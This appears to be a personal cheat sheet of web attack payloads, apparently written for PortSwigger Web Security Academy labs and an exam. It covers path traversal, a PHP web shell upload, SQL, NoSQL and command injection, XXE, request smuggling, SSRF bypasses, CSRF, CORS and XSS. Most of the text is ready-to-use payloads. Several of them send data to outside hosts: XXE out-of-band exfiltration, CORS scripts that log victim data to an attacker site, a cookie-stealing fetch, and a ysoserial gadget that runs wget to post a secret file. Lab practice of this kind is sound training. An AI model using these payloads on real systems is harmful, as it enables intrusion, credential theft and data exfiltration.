# notes
## **PATH TRAVERSAL**
Default way:

>GET /image?filename=../../../../../../../../etc/passwd

Url-Encoded:

>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

Way, when `../` erased:

>....//....//....//....//

When filename should start with some string 

>/var/www/images/../../../../../etc/passwd

When server URL-decode of the input before using it.
>..%252f..%252f..%252fetc/passwd

When server require ending, like `png` , use null bytes, for example
>../../../etc/passwd%00.png





## **FILE UPLOAD**
#Default way:
<?php echo system($_GET['command']); ?>

#Flawed file type validation:
Change content type to image/jpeg

#Script execution can be disabled in a separate folder. This can be bypassed with the help of path traversal:
Instead of 
`Content-Disposition: form-data; name="avatar"; filename="exploit.php"`
  We can use
`Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
  Or obfuscated versions


#Polyglot file upload
`exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`

#Allow via edit of .htaccess
can be bypassed as .phar
### **SQL INJECTION**

Login Bypass:

`administrator'--`

#Substring:

`SUBSTRING('foobar', 4, 2)`
Oracle `SUBSTR('foobar', 4, 2)`

#Simle WAF Bypass by encoding:

`<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>`

`<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`


### **UNION SQL INJECTION**

Simple Data Retrieve (request `SELECT name, description FROM products WHERE category = 'Gifts'`):

`' UNION SELECT username, password FROM users--`

**Oracle add `from dual`**

### Determine number of columns:

`' ORDER BY 3--`
Second method, allow to determine type of data in column:

`' UNION SELECT NULL,NULL,NULL--`/`' UNION SELECT 'a',NULL,NULL,NULL--`

### Concatenation of strings:

`' UNION SELECT username || '~' || password FROM users--`
Mysql `CONCAT('foo','bar')` or `'foo' 'bar'` note space.

## **BLIND SQL INJECTION**

### conditional based

`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`

### error based

`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`

`'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

### visible errors based

`' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

### time based

`'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

### out of band interaction

`'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`


## **Command Injection**

### Simple

`1|whoami`

### time delays

`email=x||ping+-c+10+127.0.0.1||`

### out of band interaction

`email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||`

## **XXE**

### retrieve files

` <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck> `

### by xinclude

`<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>`


### ssrf

`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`

### by external dtd

`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0aa800a30441eeb8b8d95f79014c003f.exploit-server.net/malicious.dtd"> %xxe;]>`

On server

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://tvshzpfsrtbjnwnzfbxijlb3yu4lsfg4.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;
```


# HTTP request smuggling - writing one request so that the server thinks that it is 2 different.
It uses 2 headers. `Content-Length: x` and `Transfer-Encoding: chunked`. **It works only in HTTTP/1.1**.

## Test for CL.TE
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```
## Test for TE.CL
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```


## CL.TE
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0/49 char here

GET /404 HTTP/1.1
Foo: x
```
Front-end server support only Content-Length header, backend support Transfer-Encoding. Front pass all as 1 request, backend split into two and read second one as new request, which start from
word SMUGGLED, as method. And next request passed to server will be added to this, and will arise error as here:

```
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```






## TE.CL
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

/7c char
````
Front-end server support Transfer-Encoding header, backend support only Content-Length. Front pass all as 1 request, backend split into two and read second one as new request. And next request passed to server will be added to this, and will arise error as here:
```
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```




## TE.TE
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 8
Transfer-Encoding: cow
Transfer-Encoding: chunked

0


G
```
Front-end server support Transfer-Encoding, but can be bypassed, to be readed backend server.
Bypass methods:
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```
**SSRF**
*Blacklist*
Change 127.0.0.1 for 
>127.1

>017700000001

>2130706433

>spoofed.burpcollaborator.net

Also use /aDmin and other variants

*Whitelist*
Use original host as login:
>http://original:pass@evil.com

Use original host as archor #
>http://evil.com#original

Use registered domain
>http://original.evil.com

Url encode once/twice
>http://%65vil.com

Compilance: use http:/evil@original.com/admin/delete - bypass. Then http:/evil#@original.com/admin/delete - not bypass. Then url encode '#' and get >http://localhost%23@stock.weliketoshop.net/admin/delete


## **CSRF**
# CSRF where token is duplicated in cookie
```
<html>
  <body>
    <form action="https://0aa1006004b2a765804530a000d000e2.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wiener4&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="RzJo0DwqRiulhBMA0f1HKAvMA2IYUdVZ" />
      <input type="submit" value="Submit request" />
    </form>
<img src="https://0aa1006004b2a765804530a000d000e2.web-security-academy.net//?search=1%0d%0aSet-Cookie:+csrf%3dRzJo0DwqRiulhBMA0f1HKAvMA2IYUdVZ%3b+SameSite%3dNone" onerror=document.forms[0].submit();>
  </body>
</html>
```
## NoSQL injection.
Tests:
```
'"`{
;$Foo}
$Foo \xYZ
```

Get all categories
>this.category == 'fizzy'||'1'=='1

Operators
```
$where - Matches documents that satisfy a JavaScript expression.
$ne - Matches all values that are not equal to a specified value.
$in - Matches all of the values specified in an array.
$regex - Selects documents where values match a specified regular expression.
```

Login bypass
```
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}

{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

Get data
Password
```
admin' && this.password.match(/\d/) || 'a'=='b

admin' && this.password[0] === 'r
```
Object fields
Test for vuln
```
{"username":"wiener","password":"peter", "$where":"0"}
{"username":"wiener","password":"peter", "$where":"1"}
```
Get fields name
```
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```
###CORS
Default script, when server just reflect our origin.
```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};

```
Default script, when server allow null. Use iframe, because it doesn't have origin.

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```
Sometimes CORS is set up correct, but it allow requests from his http subdomains, then
```
<script>
document.location="http://stock.0a8d0004030bc63982c358ab00f600d7.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a8d0004030bc63982c358ab00f600d7.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
Note - encode < to not have errors
###XSS

"-alert(window["document"]["cookie"])-"


###EXAM

`"-eval(atob('fetch("https://exploitserver/?jsonc=" + window["document"]["cookie"])'))-"` atob - decode base64
`CAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)--`
` ./java -jar ysoserial-all.jar  CommonsCollections6 'wget http://burlp --post-file=/home/carlos/secret' | base64 -w 0
`
